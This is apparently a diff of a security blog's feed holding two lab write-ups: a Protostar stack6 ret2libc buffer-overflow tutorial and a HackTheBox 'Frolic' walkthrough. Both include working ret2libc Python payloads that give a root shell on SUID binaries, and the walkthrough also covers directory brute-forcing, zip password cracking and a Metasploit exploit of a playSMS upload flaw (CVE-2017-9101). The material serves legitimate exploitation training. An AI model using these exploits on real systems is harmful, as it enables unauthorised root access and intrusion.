-&lt;h4 id=&quot;again--this-will-execute-binsh-as-root-because-this-binary-is-an-suid-binary-if-it-wasnt-suid-we-would-get-a-shell-as-the-same-user-we-can-check-by-using-find-&quot;&gt;Again , this will execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; as root because this binary is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary. If it wasn’t &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; we would get a shell as the same user. We can check by using &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /opt/protostar/bin/ -perm -4000 | grep stack6&lt;/code&gt;
-&lt;img src=&quot;/images/binary-exploitation/BOF6/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;as-you-can-see-stack6-is-an-suid-binary&quot;&gt;As you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;stack6&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary.&lt;/h4&gt;
-&lt;h4 id=&quot;so-first-of-all--after-we-call-system-we-will-need-to-give-it-binsh--how-will-we-do-that--a-nice-way-to-do-it-is-to-store-binsh-in-an-environment-variable-i-created-a-variable-and-called-it-shell-&quot;&gt;So first of all , after we call &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; we will need to give it &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; , how will we do that ? A nice way to do it is to store &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; in an environment variable. I created a variable and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-need-to-find-the-address-of-that-variable--we-can-do-it-from-gdb-by-setting-a-breakpoint-at-main--then-running-the-program-and-doing-this--xs-char-environx-where-x-is-a-number--this-will-print-the-address-of-an-environment-variable-we-will-keep-trying-numbers-until-we-get-the-address-of-shell&quot;&gt;Now we need to find the address of that variable , we can do it from &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; by setting a breakpoint at main , then running the program and doing this : &lt;code class=&quot;highlighter-rouge&quot;&gt;x/s *((char **)environ+x)&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;but-i-found-a-better-way-to-do-it-when-i-was-reading-an-article-on-shellblade-we-will-use-a-c-program-to-tell-us-the-estimated-address&quot;&gt;But I found a better way to do it when I was reading an article on &lt;a href=&quot;https://www.shellblade.net/&quot;&gt;shellblade&lt;/a&gt;. We will use a &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; program to tell us the estimated address.&lt;/h4&gt;
-&lt;h4 id=&quot;code-&quot;&gt;Code :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-int main(int argc, char **argv)
-{
-        char *ptr = getenv(&quot;SHELL&quot;);
-        if (ptr != NULL)
-        {
-                printf(&quot;Estimated address: %p\n&quot;, ptr);
-                return 0;
-        }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-compile-it--gcc-addressc--o-address-&quot;&gt;Then we will compile it : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc address.c -o address&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;as-you-can-see-its-telling-us-the-address-of-the-environment-variable-shell-now-keep-in-mind-that-this-is-not-the-exact-address-and-we-will-need-to-go-up-and-down-to-get-the-right-address&quot;&gt;As you can see it’s telling us the address of the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.&lt;/h4&gt;
-&lt;h4 id=&quot;lets-start-by-finding-the-offset-as-we-did-before-we-will-use-pattern_createrb-and-pattern_offsetrb-from-metasploit-exploitation-tools&quot;&gt;Let’s start by finding the offset. As we did before we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create.rb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset.rb&lt;/code&gt; from metasploit exploitation tools.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_create.rb -l 100&lt;/code&gt;
-&lt;img src=&quot;/images/binary-exploitation/BOF6/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-have-our-pattern-now-lets-run-the-program-in-gdb-and-set-a-breakpoint-before-main-break-main-then-we-will-type-c-to-continue-and-paste-the-pattern-the-buffer-will-overflow-and-we-will-see-exactly-where-did-the-overflow-happen-&quot;&gt;We have our pattern now let’s run the program in gdb and set a breakpoint before main &lt;code class=&quot;highlighter-rouge&quot;&gt;break *main&lt;/code&gt;. Then we will type &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-the-address-0x37634136--now-lets-go-back-and-use-pattern_offsetrb-&quot;&gt;We got the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x37634136&lt;/code&gt; , now let’s go back and use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset.rb&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_offset.rb -q 0x37634136&lt;/code&gt;
-&lt;img src=&quot;/images/binary-exploitation/BOF6/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-after-80-chars-the-buffer-overflows-next-thing-to-check-is-the-addresses-of-system-and-exit-from-gdb-we-will-set-a-break-point-at-main-and-type-r-to-run-the-program-after-it-reaches-the-break-point-and-breaks-we-can-get-the-address-of-system-by-typing-p-system-and-we-will-do-the-same-thing-for-exit-p-exit-&quot;&gt;So after 80 chars the buffer overflows. Next thing to check is the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;. From gdb we will set a break point at main and type &lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt; to run the program. After it reaches the break point and breaks we can get the address of system by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;p system&lt;/code&gt; and we will do the same thing for exit &lt;code class=&quot;highlighter-rouge&quot;&gt;p exit&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;address-of-system--0xb7ecffb0&quot;&gt;Address of system : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7ecffb0&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;address-of-exit--0xb7ec60c0&quot;&gt;Address of exit : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7ec60c0&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;lastly-we-will-check-the-address-of-shell-again-because-its-subject-to-change-&quot;&gt;Lastly we will check the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; again because it’s subject to change :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;address--0xbffff985&quot;&gt;Address : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff985&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;lets-check-our-notes-&quot;&gt;Let’s check our notes :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;ok--we-are-ready-to-write-our-exploit--we-will-use-struct-import-struct-like-we-did-before-we-will-create-a-variable-for-the-chars-we-will-use-to-fill-the-buffer-and-call-it-buffer--its-value-will-be-80-as&quot;&gt;Ok , we are ready to write our exploit , we will use struct &lt;code class=&quot;highlighter-rouge&quot;&gt;import struct&lt;/code&gt; like we did before. We will create a variable for the chars we will use to fill the buffer and call it &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt; , its value will be 80 A’s.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;buffer = &quot;A&quot; * 80&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-create-3-variables-to-hold-the-addresses-of-system--exit-and-shell-we-will-use-struct-to-reverse-the-addresses&quot;&gt;Then we will create 3 variables to hold the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;. We will use struct to reverse the addresses.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;system = struct.pack(&quot;I&quot; ,0xb7ecffb0)&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;shell = struct.pack(&quot;I&quot; ,0xbffff985)&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-finally-we-will-print-the-payload&quot;&gt;And finally we will print the payload.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;print buffer + system + exit + shell&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;final-script-&quot;&gt;Final script :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct
-
-buffer = &quot;A&quot; * 80
-system = struct.pack(&quot;I&quot; ,0xb7ecffb0)
-exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)
-shell = struct.pack(&quot;I&quot; ,0xbffff985)
-
-print buffer + system + exit + shell
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-have-to-remember-that-the-address-of-shell-is-not-the-exact-address-and-we-will-need-to-go-up-or-down-for-a-little-bit-we-will-execute-the-script-and-redirect-the-output-to-a-file-and-name-it-payload-python-tmpstack6py--tmppayload--then-we-will-cat-the-file-and-pipe-the-output-to-stack6-&quot;&gt;We have to remember that the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. &lt;code class=&quot;highlighter-rouge&quot;&gt;python /tmp/stack6.py &amp;gt; /tmp/payload&lt;/code&gt; , Then we will cat the file and pipe the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;./stack6&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-no-shell--after-going-up-and-down-by-editing-the-address-in-the-python-script-i-finally-got-the-right-address-which-is-0xbffff992-&quot;&gt;And no shell , After going up and down by editing the address in the python script I finally got the right address which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff992&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python /tmp/stack6.py &amp;gt; /tmp/payload&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /tmp/payload - | ./stack6&lt;/code&gt;
-&lt;img src=&quot;/images/binary-exploitation/BOF6/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;root-shell&quot;&gt;root shell!&lt;/h4&gt;
-&lt;h4 id=&quot;so-after-editing-the-address-of-shell-variable--the-script-will-be-like-this-&quot;&gt;So after editing the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; variable , the script will be like this :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct
-
-buffer = &quot;A&quot; * 80
-system = struct.pack(&quot;I&quot; ,0xb7ecffb0)
-exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)
-shell = struct.pack(&quot;I&quot; ,0xbffff992)
-
-print buffer + system + exit + shell
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/15.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; , Tweet about the article if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&amp;gt; address of system() –&amp;gt; address of exit() –&amp;gt; /bin/sh” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &amp;gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &amp;gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF6/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sc frolic.htb We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first. HTTP Initial Enumeration By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 12:53:58 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) ===================================================== We got /admin , /backup , /dev and /test. /backup : /dev : We got 403 on /dev , let’s run gobuster again on /dev : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/dev/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 17:51:41 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /backup (Status: 301) /test (Status: 200) ===================================================== We got /backup and /test /dev/backup : /playsms , Let’s check that : It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev. /test : It’s just the phpinfo() page /admin : on /admin there’s an authentication form , and the title is “c’mon i m hackable” :D Hacking the “Hackable” form Let’s take a look at the source code : We notice a script called login.js , maybe authentication is handled by that script. login.js : var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;amp;&amp;amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } We got the username and the password : admin:superduperlooperpassword_lol And after we login we find … this : ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Ook! After searching on google for a long time I found out that this is an esoteric language called Ook!. Read about esoteric languages here Read about Ook! here I used an online interpreter for Ook! on a website called dcode.fr Output : Nothing here check /asdiSIAJJ0QWE9JAS Playsms password /asdiSIAJJ0QWE9JAS : UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it : We got a weird output , let’s redirect the output into a file and check what kind of files is that : It’s a zip archive , let’s unzip it : Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password : fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt The password is “password” ! After extraction we get a file called index.php : 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a Hex encoded , let’s decode it. I will use a website called CyberChef : Base64 encoded output , let’s decode one more time : Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again : Output : idkwhatispass Let’s try to login to playsms as admin with this password : And it worked. Exploiting Authenticated RCE and getting user There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it. The exploit worked and we have a meterpreter session now : We owned user ! Buffer Overflow in rop In the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find: find /home/ayush/.binary/ -perm -4000 Let’s see what is it doing : So it takes our input and just ouputs it , Let’s try giving it a long string : We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them here We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it here First of all , gdb is not installed on the box : So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdb Let’s find the length of the buffer : So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Offset : 0x0015ba0b Then we need the address of libc , we can use ldd to get it : ldd rop Address : 0xb7e19000 Then we will add the two addresses to get the address of /bin/sh Address of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b Now we need the addresses of system() and exit() : Address of system() : 0xb7e53da0 Address of exit() : 0xb7e479d0 Our final exploit will be: #!/usr/bin/python import struct buf = &quot;A&quot; * 52 system = struct.pack(&quot;I&quot; ,0xb7e53da0) exit = struct.pack(&quot;I&quot; ,0xb7e479d0) shell = struct.pack(&quot;I&quot; ,0xb7f74a0b) print buf + system + exit + shell Let’s upload and run it : ./rop `python /tmp/exploit.py` And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it 